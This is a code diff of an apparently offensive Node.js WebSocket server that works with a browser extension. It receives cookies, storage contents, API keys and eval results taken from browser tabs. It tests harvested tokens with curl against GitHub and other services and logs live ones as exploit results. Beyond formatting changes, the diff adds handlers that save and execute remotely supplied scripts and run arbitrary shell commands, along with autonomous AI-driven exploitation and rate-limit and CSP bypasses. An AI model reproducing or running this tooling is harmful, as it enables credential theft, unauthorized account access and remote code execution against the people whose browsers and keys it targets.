                             systemPrompt: 'Elite security researcher. Respond with JSON array ONLY. No explanations.',
                             batchMode: true
                         };
-                        
+
                         if (smartResult.useProvider) {
                             log(`   🔄 Using provider: ${smartResult.useProvider.toUpperCase()}`, 'dim');
                             queryOptions.forceProvider = smartResult.useProvider;
                         }
-                        
+
                         const response = await TerminalAI.query(batchPrompt, queryOptions);
-                        
+
                         if (response && !response.error) {
                             // Cache response
                             UltraRateLimitBypass.cache.set(batchPrompt, response);
-                            
+
                             // Parse JSON array
                             try {
                                 const match = response.match(/\[[\s\S]*?\]/);
                                 if (match) {
                                     batchResults = JSON.parse(match[0]);
                                 }
-                            } catch(parseErr) {
+                            } catch (parseErr) {
                                 log(`   ⚠️ Parse error, extracting manually...`, 'yellow');
                                 // Try to extract individual results
                                 const pattern = /\[(\d+)\][\s\S]*?service[:\s"]+([^",\n]+)/gi;
@@ -8122,40 +8122,40 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                                 }
                             }
                         }
-                    } catch(e) {
+                    } catch (e) {
                         log(`   ❌ Batch analysis error: ${e.message}`, 'red');
                     }
-                    
+
                     // === PROCESS EACH FINDING IN BATCH ===
                     for (let i = 0; i < batch.length; i++) {
                         const finding = batch[i];
                         const result = batchResults.find(r => r.index === i + 1) || batchResults[i] || {};
                         const fullValue = finding.fullValue || finding.value;
-                        
+
                         console.log(`\n${C.cyan}   [${batchIndex * batchSize + i + 1}/${uniqueFindings.length}] ${finding.type}${C.reset}`);
                         console.log(`${C.dim}      Value: ${(fullValue || '').substring(0, 60)}...${C.reset}`);
-                        
+
                         // Skip false positives
                         if (result.isFalsePositive) {
                             console.log(`${C.yellow}      ⚠️ FALSE POSITIVE - Skipping${C.reset}`);
                             continue;
                         }
-                        
+
                         console.log(`${C.green}      ✅ Service: ${result.service || 'unknown'}${C.reset}`);
                         console.log(`${C.yellow}      💰 Bounty Est: ${result.bountyEstimate || 'TBD'}${C.reset}`);
-                        
+
                         // === EXECUTE VALIDATION COMMANDS (No AI needed!) ===
                         const commandsToExecute = [];
-                        
+
                         // Add AI-suggested command
                         if (result.curlCommand && result.curlCommand.startsWith('curl')) {
                             commandsToExecute.push({ cmd: result.curlCommand, type: 'ai-suggested' });
                         }
-                        
+
                         // Add service-specific commands based on pattern (no AI needed)
                         const serviceLower = (result.service || '').toLowerCase();
                         if (serviceLower.includes('github') || fullValue?.startsWith('gh')) {
-                            commandsToExecute.push({ 
+                            commandsToExecute.push({
                                 cmd: `curl -s -H "Authorization: token ${fullValue}" https://api.github.com/user`,
                                 type: 'github'
                             });
@@ -8190,30 +8190,30 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                                 type: 'groq'
                             });
                         }
-                        
+
                         // Execute commands (limit to 3)
                         let hasLiveResponse = false;
                         for (const { cmd, type } of commandsToExecute.slice(0, 3)) {
                             console.log(`${C.dim}      [${type}] $ ${cmd.substring(0, 70)}...${C.reset}`);
-                            
+
                             try {
                                 const result = await executeCommand(cmd);
-                                
+
                                 if (result.stdout) {
                                     const output = result.stdout.substring(0, 200);
-                                    if (result.stdout.includes('"error"') || 
-                                        result.stdout.includes('invalid') || 
+                                    if (result.stdout.includes('"error"') ||
+                                        result.stdout.includes('invalid') ||
                                         result.stdout.includes('unauthorized') ||
                                         result.stdout.includes('REQUEST_DENIED')) {
                                         console.log(`${C.dim}         ⚪ Invalid/Expired${C.reset}`);
-                                    } else if (result.stdout.includes('"id"') || 
-                                               result.stdout.includes('"login"') ||
-                                               result.stdout.includes('"ok":true') ||
-                                               result.stdout.includes('"data"')) {
+                                    } else if (result.stdout.includes('"id"') ||
+                                        result.stdout.includes('"login"') ||
+                                        result.stdout.includes('"ok":true') ||
+                                        result.stdout.includes('"data"')) {
                                         console.log(`${C.red}         🔴 LIVE! Valid response detected${C.reset}`);
                                         console.log(`${C.green}         ${output}${result.stdout.length > 200 ? '...' : ''}${C.reset}`);
                                         hasLiveResponse = true;
-                                        
+
                                         liveFindings.push({
                                             type: finding.type,
                                             value: fullValue,
@@ -8225,13 +8225,13 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                                         console.log(`${C.cyan}         📥 ${output}${C.reset}`);
                                     }
                                 }
-                            } catch(e) {
+                            } catch (e) {
                                 console.log(`${C.dim}         ⚠️ ${e.message}${C.reset}`);
                             }
-                            
+
                             await new Promise(r => setTimeout(r, 300));
                         }
-                        
+
                         if (hasLiveResponse) {
                             DataStore.addExploitResult({
                                 type: finding.type,
@@ -8242,15 +8242,15 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                             });
                         }
                     }
-                    
+
                     // Delay between batches (5-8 seconds to respect rate limits)
                     if (batchIndex < batches.length - 1) {
                         const delay = 5000 + Math.random() * 3000;
-                        log(`\n   ⏳ Waiting ${Math.round(delay/1000)}s before next batch...`, 'dim');
+                        log(`\n   ⏳ Waiting ${Math.round(delay / 1000)}s before next batch...`, 'dim');
                         await new Promise(r => setTimeout(r, delay));
                     }
                 }
-                
+
                 // === FINAL SUMMARY ===
                 console.log(`\n${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
                 console.log(`${C.green}   ✅ BATCHED ANALYSIS COMPLETE!${C.reset}`);
@@ -8260,7 +8260,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 log(`   📈 AI Calls Made: ${batches.length} (vs ${uniqueFindings.length * 3} without batching!)`, 'green');
                 UltraRateLimitBypass.showStatus();
             }
-            
+
             // Send acknowledgment back to browser
             ws.send(JSON.stringify({
                 type: 'report_received',
@@ -8269,23 +8269,23 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 timestamp: Date.now()
             }));
             break;
-        
+
         // Receive findings from browser
         case 'findings':
             if (!client.authenticated) return;
-            
+
             const findingsCount = message.findings?.length || 0;
             const critCount = message.findings?.filter(f => f.severity === 'critical' || f.severity === 'CRITICAL').length || 0;
             const highCount = message.findings?.filter(f => f.severity === 'high' || f.severity === 'HIGH').length || 0;
             const liveCount = message.findings?.filter(f => f.live).length || 0;
-            
+
             logBox(`📥 FINDINGS RECEIVED FROM BROWSER`, [
                 `Total: ${findingsCount} findings`,
                 `Critical: ${critCount} | High: ${highCount} | Live: ${liveCount}`,
                 `Source: ${message.browserData?.domain || message.browserData?.url || 'unknown'}`,
                 `Time: ${new Date().toLocaleTimeString()}`
             ], 'green');
-            
+
             // Display each finding
             message.findings?.forEach((f, i) => {
                 const sev = (f.severity || 'unknown').toUpperCase();
@@ -8293,28 +8293,28 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 const liveTag = f.live ? `${C.green}[LIVE]${C.reset}` : '';
                 console.log(`${C[sevColor]}  [${i}] ${sev}${C.reset} ${f.type || f.patternName || '?'}: ${liveTag} ${(f.value || '').substring(0, 55)}...`);
             });
-            
+
             message.findings?.forEach(f => DataStore.addFinding(f));
             DataStore.updateBrowserData(message.browserData || {});
-            
+
             // AI Collaboration: Analyze findings and send intelligence back
             if (TerminalAI.config.isActive && findingsCount > 0) {
                 log('\n🤖 AI COLLABORATION: Analyzing findings...', 'magenta');
-                
+
                 // Use collaboration mode for bidirectional AI communication
                 const collabResult = await TerminalAI.processCollaboration(
                     message.findings,
                     message.browserData || {},
                     ws
                 );
-                
+
                 // Also send traditional analysis
                 if (!collabResult) {
                     const analysis = await TerminalAI.generateExploitPlan(
                         message.findings,
                         message.browserData || {}
                     );
-                    
+
                     ws.send(JSON.stringify({
                         type: 'ai_analysis',
                         analysis,
@@ -8322,7 +8322,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                     }));
                 }
             }
-            
+
             // Request more data from browser (auto-sync)
             if (CONFIG.AUTO_SYNC) {
                 setTimeout(() => {
@@ -8337,16 +8337,16 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 }, 2000);
             }
             break;
-        
+
         // Receive browser data
         case 'browser_data':
             if (!client.authenticated) return;
-            
+
             const browserData = message.data;
             const dataType = browserData?.type || browserData?.dataType || 'unknown';
-            
+
             // Handle different data types from browser
-            switch(dataType) {
+            switch (dataType) {
                 case 'findings_data':
                     log(`📥 FINDINGS from browser (${browserData.count} items)`, 'green');
                     if (browserData.findings && browserData.findings.length > 0) {
@@ -8356,7 +8356,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         browserData.findings.forEach(f => DataStore.addFinding(f));
                     }
                     break;
-                    
+
                 case 'cookies_data':
                     log(`🍪 COOKIES from ${browserData.url}`, 'yellow');
                     if (browserData.cookies) {
@@ -8367,13 +8367,13 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         });
                     }
                     break;
-                    
+
                 case 'storage_data':
                     log(`💾 STORAGE from ${browserData.url}`, 'blue');
                     console.log(`${C.dim}  localStorage: ${Object.keys(browserData.localStorage || {}).length} items${C.reset}`);
                     console.log(`${C.dim}  sessionStorage: ${Object.keys(browserData.sessionStorage || {}).length} items${C.reset}`);
                     break;
-                    
+
                 case 'all_data':
                     log(`📦 ALL DATA from ${browserData.data?.url}`, 'magenta');
                     const allData = browserData.data;
@@ -8383,39 +8383,39 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         console.log(`${C.blue}  Forms: ${allData.forms?.length || 0}${C.reset}`);
                         console.log(`${C.cyan}  LocalStorage: ${Object.keys(allData.localStorage || {}).length} items${C.reset}`);
                         DataStore.updateBrowserData(allData);
-                        
+
                         // Save findings
                         if (allData.findings) {
                             allData.findings.forEach(f => DataStore.addFinding(f));
                         }
                     }
                     break;
-                    
+
                 case 'html_data':
                     log(`📄 HTML from ${browserData.selector}`, 'blue');
                     console.log(`${C.dim}  Length: ${browserData.html?.length || 0} chars${C.reset}`);
                     break;
-                    
+
                 case 'fetch_result':
                     log(`🌐 FETCH ${browserData.status} - ${browserData.url}`, browserData.status < 400 ? 'green' : 'red');
                     if (browserData.data && browserData.data.length < 500) {
                         console.log(`${C.dim}${browserData.data}${C.reset}`);
                     }
                     break;
-                    
+
                 case 'fetch_error':
                     log(`❌ FETCH ERROR: ${browserData.error}`, 'red');
                     break;
-                    
+
                 case 'eval_result':
                     log(`📤 EVAL RESULT:`, 'green');
                     if (browserData.result !== undefined) console.log(browserData.result);
                     break;
-                    
+
                 case 'eval_error':
                     log(`❌ EVAL ERROR: ${browserData.error}`, 'red');
                     break;
-                
+
                 // API Keys from browser
                 case 'api_keys':
                     log(`🔑 API KEYS received from browser`, 'green');
@@ -8435,27 +8435,27 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         }));
                     }
                     break;
-                    
+
                 case 'status_response':
-                    log(`📡 BROWSER STATUS: ${browserData.tabId?.substring(0,8)}`, 'cyan');
+                    log(`📡 BROWSER STATUS: ${browserData.tabId?.substring(0, 8)}`, 'cyan');
                     console.log(`${C.dim}  URL: ${browserData.url}${C.reset}`);
                     console.log(`${C.dim}  Title: ${browserData.title}${C.reset}`);
                     console.log(`${C.dim}  Findings: ${browserData.findings}${C.reset}`);
                     console.log(`${C.dim}  AI Active: ${browserData.aiActive}${C.reset}`);
                     break;
-                    
+
                 case 'ai_response':
                     log(`🤖 AI RESPONSE FROM BROWSER:`, 'magenta');
                     if (browserData.response !== undefined) console.log(browserData.response);
                     break;
-                    
+
                 case 'ai_analysis':
                     log(`🤖 AI ANALYSIS FROM BROWSER:`, 'magenta');
                     if (browserData.analysis !== undefined) console.log(browserData.analysis);
                     break;
-                    
+
                 case 'tab_registered':
-                    log(`📑 TAB REGISTERED: ${browserData.tabId?.substring(0,8)}`, 'green');
+                    log(`📑 TAB REGISTERED: ${browserData.tabId?.substring(0, 8)}`, 'green');
                     console.log(`${C.dim}  URL: ${browserData.url}${C.reset}`);
                     client.tabs.push({
                         tabId: browserData.tabId,
@@ -8463,11 +8463,11 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         title: browserData.title
                     });
                     break;
-                    
+
                 case 'command_error':
                     log(`❌ COMMAND ERROR (${browserData.command}): ${browserData.error}`, 'red');
                     break;
-                
+
                 // Handle new dataType formats from browser auto-sync helpers
                 case 'cookies':
                     log(`🍪 COOKIES from ${browserData.domain || browserData.url}`, 'yellow');
@@ -8480,7 +8480,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         DataStore.updateBrowserData({ cookies: browserData.cookies, domain: browserData.domain });
                     }
                     break;
-                    
+
                 case 'storage':
                     log(`💾 STORAGE from ${browserData.domain || browserData.url}`, 'blue');
                     const lsKeys = Object.keys(browserData.localStorage || {});
@@ -8491,7 +8491,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                     ssKeys.slice(0, 10).forEach(k => console.log(`${C.dim}    SS: ${k}${C.reset}`));
                     DataStore.updateBrowserData({ localStorage: browserData.localStorage, sessionStorage: browserData.sessionStorage });
                     break;
-                    
+
                 default:
                     log(`📥 Browser data (${dataType}): ${message.data?.url || ''}`, 'blue');
                     // Store any unhandled data too
@@ -8500,35 +8500,128 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                     }
             }
             break;
-        
+
+        // Deploy script from extension
+        case 'deploy_script':
+            if (!client.authenticated) return;
+            log(`📥 Deploy script request: ${message.scriptName}`, 'blue');
+
+            if (message.scriptName && message.content) {
+                try {
+                    const scriptPath = path.join(__dirname, message.scriptName);
+                    fs.writeFileSync(scriptPath, message.content);
+                    log(`📜 Script saved to: ${scriptPath}`, 'green');
+
+                    // Execute immediately
+                    log(`🚀 Executing ${message.scriptName}...`, 'magenta');
+                    const child = exec(`node "${scriptPath}"`, (error, stdout, stderr) => {
+                        if (error) {
+                            log(`❌ Script execution error: ${error.message}`, 'red');
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({
+                                    type: 'script_error',
+                                    script: message.scriptName,
+                                    error: error.message
+                                }));
+                            }
+                            return;
+                        }
+
+                        if (stdout) {
+                            console.log(stdout); // Log locally too
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({
+                                    type: 'script_output',
+                                    script: message.scriptName,
+                                    output: stdout
+                                }));
+                            }
+                        }
+
+                        if (stderr) {
+                            console.error(stderr);
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({
+                                    type: 'script_error',
+                                    script: message.scriptName,
+                                    error: stderr
+                                }));
+                            }
+                        }
+                    });
+
+                    ws.send(JSON.stringify({
+                        type: 'deploy_success',
+                        script: message.scriptName,
+                        path: scriptPath
+                    }));
+
+                } catch (e) {
+                    log(`❌ Deploy error: ${e.message}`, 'red');
+                    ws.send(JSON.stringify({ type: 'deploy_error', error: e.message }));
+                }
+            } else {
+                ws.send(JSON.stringify({ type: 'deploy_error', error: 'Missing script name or content' }));
+            }
+            break;
+
+        // Remote Shell Execution (from extension)
+        case 'shell_exec':
+            if (!client.authenticated) return;
+            log(`$ ${message.command}`, 'cyan');
+
+            exec(message.command, (error, stdout, stderr) => {
+                const response = {
+                    type: 'shell_output',
+                    command: message.command,
+                    source: message.source
+                };
+
+                if (error) {
+                    response.error = error.message;
+                    log(`❌ Shell error: ${error.message}`, 'red');
+                } else {
+                    response.output = stdout;
+                    if (stderr) response.error = stderr;
+
+                    if (stdout) console.log(stdout);
+                    if (stderr) console.error(stderr);
+                }
+
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify(response));
+                }
+            });
+            break;
+
         // Execute command request
         case 'execute':
             if (!client.authenticated) return;
             log(`📥 Execute request from browser: ${message.command.substring(0, 50)}...`, 'blue');
-            
-            const result = TerminalAI.config.isActive 
+
+            const result = TerminalAI.config.isActive
                 ? await CommandExecutor.executeWithAI(message.command)
                 : await CommandExecutor.execute(message.command);
-            
+
             ws.send(JSON.stringify({
                 type: 'execute_result',
                 id: message.id,
                 ...result
             }));
-            
+
             DataStore.addExploitResult(result);
             break;
-        
+
         // Batch execute
         case 'execute_batch':
             if (!client.authenticated) return;
             log(`📥 Batch execute: ${message.commands.length} commands`, 'blue');
-            
+
             const results = [];
             for (const cmd of message.commands) {
                 const r = await CommandExecutor.execute(cmd);
                 results.push(r);
-                
+
                 // Send progress
                 ws.send(JSON.stringify({
                     type: 'batch_progress',
@@ -8537,10 +8630,10 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                     total: message.commands.length,
                     result: r
                 }));
-                
+
                 await new Promise(r => setTimeout(r, message.delay || 500));
             }
-            
+
             const successCount = results.filter(r => r.success).length;
             ws.send(JSON.stringify({
                 type: 'batch_complete',
@@ -8553,7 +8646,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 }
             }));
             break;
-        
+
         // AI query from browser
         case 'ai_query':
             if (!client.authenticated) return;
@@ -8565,16 +8658,16 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 }));
                 return;
             }
-            
+
             const queryText = message.query || message.prompt;
             log(`🤖 AI query from browser: ${queryText?.substring(0, 50)}...`, 'magenta');
-            
+
             const aiResponse = await TerminalAI.query(queryText, {
                 browserData: message.context,
                 from: message.from || 'browser',
                 collaboration: message.collaboration || false
             });
-            
+
             ws.send(JSON.stringify({
                 type: 'ai_response',
                 requestId: message.requestId || message.id,
@@ -8582,18 +8675,18 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 fromTerminalAI: true
             }));
             break;
-        
+
         // AI Proxy Request — Browser sends AI request for terminal to execute (CSP bypass)
         case 'ai_proxy_request':
             if (!client.authenticated) return;
-            
+
             const proxyProvider = message.provider || 'groq';
             const proxyApiKey = message.apiKey || TerminalAI.config.apiKey;
             const proxyPrompt = message.prompt;
             const proxyRequestId = message.requestId;
-            
+
             log(`🔄 AI Proxy Request: ${proxyProvider} (CSP bypass for browser)`, 'magenta');
-            
+
             if (!proxyApiKey) {
                 ws.send(JSON.stringify({
                     type: 'ai_proxy_response',
@@ -8603,11 +8696,11 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 }));
                 return;
             }
-            
+
             try {
                 // Use terminal's AI to proxy the request
                 const proxyResponse = await TerminalAI.queryWithKey(proxyPrompt, proxyProvider, proxyApiKey);
-                
+
                 ws.send(JSON.stringify({
                     type: 'ai_proxy_response',
                     requestId: proxyRequestId,
@@ -8616,7 +8709,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                     provider: proxyProvider,
                     viaCspBypass: true
                 }));
-                
+
                 log(`✅ AI Proxy response sent`, 'green');
             } catch (e) {
                 ws.send(JSON.stringify({
@@ -8627,20 +8720,20 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 }));
             }
             break;
-        
+
         // AI Key Validation — Browser asks terminal to validate API key (CSP bypass)
         case 'ai_validate_key':
             if (!client.authenticated) return;
-            
+
             const validateProvider = message.provider || 'groq';
             const validateKey = message.apiKey;
             const validateRequestId = message.requestId;
-            
+
             log(`🔑 Validating API key via terminal proxy: ${validateProvider}`, 'magenta');
-            
+
             try {
                 const isValid = await TerminalAI.validateKeyDirect(validateKey, validateProvider);
-                
+
                 ws.send(JSON.stringify({
                     type: 'ai_validate_response',
                     requestId: validateRequestId,
@@ -8648,7 +8741,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                     provider: validateProvider,
                     message: isValid ? 'Key validated successfully' : 'Key validation failed'
                 }));
-                
+
                 log(isValid ? `✅ Key validated: ${validateProvider}` : `❌ Key invalid: ${validateProvider}`, isValid ? 'green' : 'red');
             } catch (e) {
                 ws.send(JSON.stringify({
@@ -8659,7 +8752,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 }));
             }
             break;
-        
+
         // AI Collaboration — Browser AI responding to terminal AI task
         case 'ai_task_response':
             if (!client.authenticated) return;
@@ -8667,7 +8760,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 await TerminalAI.handleBrowserAIResponse(message, ws);
             }
             break;
-        
+
         // AI Collaboration — Browser AI initiating collaboration
         case 'ai_collaborate':
             if (!client.authenticated) return;
@@ -8680,7 +8773,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 );
             }
             break;
-        
+
         // Auto-sync request — browser asking terminal what it needs
         case 'sync_request':
             if (!client.authenticated) return;
@@ -8696,18 +8789,18 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 timestamp: Date.now()
             }));
             break;
-        
+
         // Ping/pong
         case 'ping':
-            ws.send(JSON.stringify({ 
-                type: 'pong', 
+            ws.send(JSON.stringify({
+                type: 'pong',
                 timestamp: Date.now(),
                 aiEnabled: TerminalAI.config.isActive,
                 findingsCount: DataStore.data.findings.length,
                 browsersConnected: connectedBrowsers.size
             }));
             break;
-        
+
         // Tab registration
         case 'register_tab':
             if (!client.authenticated) return;
@@ -8718,7 +8811,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
             });
             log(`📑 Tab registered: ${message.url}`, 'blue');
             break;
-        
+
         // Message from browser user
         case 'browser_message':
             log(`💬 MESSAGE FROM BROWSER: ${message.message}`, 'cyan');
@@ -8728,7 +8821,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
             console.log(`${C.white}  ${message.message}${C.reset}`);
             console.log(`${C.cyan}${C.bold}└───────────────────────────────────────────────────────┘${C.reset}`);
             break;
-        
+
         // Status request
         case 'status':
             ws.send(JSON.stringify({
@@ -8776,17 +8869,17 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
             if (!client.authenticated) return;
             handleGCSMessage(clientId, message, ws);
             break;
-        
+
         // ═══════════════════════════════════════════════════════════════════════
         // 🧠 AI BRAIN - AUTONOMOUS THINKING ENGINE
         // ═══════════════════════════════════════════════════════════════════════
         case 'start_brain':
             if (!client.authenticated) return;
             log('🧠 STARTING AI BRAIN - AUTONOMOUS MODE', 'magenta');
-            
+
             // Initialize AIBrain with data
             AIBrain.init(ws, message.findings || DataStore.data.findings, message.domain || DataStore.data.browserData?.domain);
-            
+
             // Start autonomous thinking
             AIBrain.startThinking().then(report => {
                 if (report) {
@@ -8796,7 +8889,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         `Discoveries: ${report.discoveries?.length || 0}`,
                         `Goals achieved: ${report.goalsAchieved || 0}/${report.totalGoals || 0}`
                     ], 'green');
-                    
+
                     ws.send(JSON.stringify({
                         type: 'brain_complete',
                         report: report,
@@ -8806,14 +8899,14 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
             }).catch(err => {
                 log(`❌ AI Brain error: ${err.message}`, 'red');
             });
-            
+
             ws.send(JSON.stringify({
                 type: 'brain_started',
                 status: 'running',
                 message: 'AI Brain is now thinking autonomously...'
             }));
             break;
-        
+
         case 'stop_brain':
             if (!client.authenticated) return;
             AIBrain.stop();
@@ -8823,7 +8916,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 status: 'stopped'
             }));
             break;
-        
+
         case 'brain_status':
             if (!client.authenticated) return;
             ws.send(JSON.stringify({
@@ -8838,14 +8931,14 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 }
             }));
             break;
-        
+
         // ═══════════════════════════════════════════════════════════════════════
         // 🚀 FULL AUTOMATION - ONE CLICK EVERYTHING
         // ═══════════════════════════════════════════════════════════════════════
         case 'full_automation':
             if (!client.authenticated) return;
             log('🚀 STARTING FULL AUTOMATION - EVERYTHING RUNS', 'red');
-            
+
             FullAutomation.start(ws, message.findings || DataStore.data.findings, message.browserData || DataStore.data.browserData)
                 .then(masterReport => {
                     logBox('🏆 FULL AUTOMATION COMPLETE', [
@@ -8855,32 +8948,32 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                         `Vulnerabilities: ${masterReport.summary?.vulnerabilities || 0}`,
                         `AI discoveries: ${masterReport.summary?.aiDiscoveries || 0}`
                     ], 'green');
-                    
+
                     ws.send(JSON.stringify({
                         type: 'full_automation_complete',
                         report: masterReport,
                         timestamp: Date.now()
                     }));
                 });
-            
+
             ws.send(JSON.stringify({
                 type: 'full_automation_started',
                 status: 'running',
                 message: 'Full automation initiated - AI Brain + Token Testing + Exploitation'
             }));
             break;
-        
+
         // ═══════════════════════════════════════════════════════════════════════
         // 🔥 MASTER AUTO EXPLOIT RESULTS - Process findings with AI prompts
         // ═══════════════════════════════════════════════════════════════════════
         case 'master_autoexploit_results':
             if (!client.authenticated) return;
-            
+
             const findings = message.findings || [];
             const totalCount = message.totalCount || findings.length;
             const criticalCount = message.criticalCount || 0;
             const vulnerableCount = message.vulnerableCount || 0;
-            
+
             logBox('🔥 MASTER AUTO EXPLOIT RESULTS RECEIVED', [
                 `Domain: ${message.domain || 'unknown'}`,
                 `Total Findings: ${totalCount}`,
@@ -8888,24 +8981,24 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 `Vulnerable: ${vulnerableCount}`,
                 `Each finding has AI prompt for processing`
             ], 'red');
-            
+
             // Store findings
             DataStore.data.masterExploitResults = findings;
-            
+
             // Process each finding with AI (in background to avoid rate limits)
             log(`📋 Processing ${findings.length} findings...`, 'cyan');
-            
+
             // Show critical/vulnerable findings first
             const criticalFindings = findings.filter(f => f.severity === 'CRITICAL' || f.isVulnerable);
-            
+
             if (criticalFindings.length > 0) {
                 console.log(`\n${C.red}${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
                 console.log(`${C.red}${C.bold}   🚨 CRITICAL/VULNERABLE FINDINGS (${criticalFindings.length})${C.reset}`);
                 console.log(`${C.red}${C.bold}═══════════════════════════════════════════════════════════════${C.reset}\n`);
-                
+
                 criticalFindings.forEach((f, i) => {
                     const keyPreview = f.key?.length > 40 ? f.key.substring(0, 20) + '...' + f.key.substring(f.key.length - 10) : f.key;
-                    console.log(`${C.red}[${i+1}] ${f.type}${C.reset}`);
+                    console.log(`${C.red}[${i + 1}] ${f.type}${C.reset}`);
                     console.log(`${C.dim}    Key: ${keyPreview}${C.reset}`);
                     console.log(`${C.dim}    Source: ${f.source}${C.reset}`);
                     if (f.isVulnerable) {
@@ -8914,41 +9007,41 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                     console.log();
                 });
             }
-            
+
             // Queue AI processing for each finding (avoid rate limits)
             const processWithAI = async () => {
                 for (let i = 0; i < Math.min(findings.length, 10); i++) {
                     const finding = findings[i];
                     if (finding.aiPrompt && TerminalAI.config.apiKey) {
                         try {
-                            log(`🤖 AI analyzing finding ${i+1}/${Math.min(findings.length, 10)}...`, 'magenta');
-                            
+                            log(`🤖 AI analyzing finding ${i + 1}/${Math.min(findings.length, 10)}...`, 'magenta');
+
                             // Use ProRateLimiter to avoid rate limits
                             await ProRateLimiter.smartWait(TerminalAI.config.provider || 'groq');
-                            
+
                             const aiResponse = await TerminalAI.query(finding.aiPrompt);
-                            
+
                             if (aiResponse && !aiResponse.includes('rate limit')) {
                                 console.log(`\n${C.magenta}${C.bold}🤖 AI Analysis for ${finding.type}:${C.reset}`);
                                 console.log(`${C.dim}${aiResponse.substring(0, 500)}${aiResponse.length > 500 ? '...' : ''}${C.reset}\n`);
                             }
-                            
+
                             // Small delay between queries
                             await new Promise(r => setTimeout(r, 2000));
-                            
-                        } catch(e) {
-                            BackgroundTaskManager.bgLog(`AI query failed for finding ${i+1}: ${e.message}`, 'AI_ANALYSIS', 'ERROR');
+
+                        } catch (e) {
+                            BackgroundTaskManager.bgLog(`AI query failed for finding ${i + 1}: ${e.message}`, 'AI_ANALYSIS', 'ERROR');
                         }
                     }
                 }
-                
+
                 log('✅ AI analysis batch complete (first 10 findings)', 'green');
                 log(`💡 Use 'analyze <index>' to analyze specific finding`, 'cyan');
             };
-            
+
             // Run AI processing in background
             BackgroundTaskManager.addTask('AI_ANALYSIS', processWithAI, { priority: 2 });
-            
+
             ws.send(JSON.stringify({
                 type: 'master_autoexploit_received',
                 status: 'processing',
@@ -8956,7 +9049,7 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
                 message: 'Results received, AI processing started'
             }));
             break;
-        
+
         case 'stop_automation':
             if (!client.authenticated) return;
             FullAutomation.stop();
@@ -8983,14 +9076,14 @@ function sendMessageToBrowser(message) {
 function broadcastToBrowsers(message) {
     const data = JSON.stringify(message);
     let sent = 0;
-    
+
     connectedBrowsers.forEach((client, id) => {
         if (client.authenticated && client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(data);
             sent++;
         }
     });
-    
+
     return sent;
 }
 
@@ -9002,7 +9095,7 @@ function sendToBrowser(command, data = {}) {
         data,
         timestamp: Date.now()
     };
-    
+
     const sent = broadcastToBrowsers(message);
     log(`📤 Sent to ${sent} browser(s): ${command}`, 'blue');
     return sent;
@@ -9091,7 +9184,7 @@ function handleGoogleDriveMessage(clientId, message, ws) {
     // In a real implementation, you'd establish a WebSocket to the server
     // and relay messages through Google Drive API
 
-    switch(message.action) {
+    switch (message.action) {
         case 'connect':
             // Establish WebSocket connection to terminal server
             establishTerminalConnection(client.googleDriveProxy, ws, clientId);
@@ -9117,7 +9210,7 @@ function handleFirebaseMessage(clientId, message, ws) {
     log(`📨 FIREBASE MSG from ${clientId}: ${message.action}`, 'blue');
 
     // Similar to Google Drive but using Firebase RTDB
-    switch(message.action) {
+    switch (message.action) {
         case 'connect':
             establishTerminalConnection(client.firebaseProxy, ws, clientId);
             break;
@@ -9140,7 +9233,7 @@ function handleGCSMessage(clientId, message, ws) {
     log(`📨 GCS MSG from ${clientId}: ${message.action}`, 'blue');
 
     // Similar to above but using GCS for message relay
-    switch(message.action) {
+    switch (message.action) {
         case 'connect':
             establishTerminalConnection(client.gcsProxy, ws, clientId);
             break;
@@ -9190,7 +9283,7 @@ function establishTerminalConnection(proxyConfig, ws, clientId) {
                     via: proxyConfig.type || 'proxy'
                 }));
 
-            } catch(e) {
+            } catch (e) {
                 log(`Message relay error: ${e.message}`, 'red');
             }
         });
@@ -9208,7 +9301,7 @@ function establishTerminalConnection(proxyConfig, ws, clientId) {
             proxyConfig.terminalWS = null;
         });
 
-    } catch(e) {
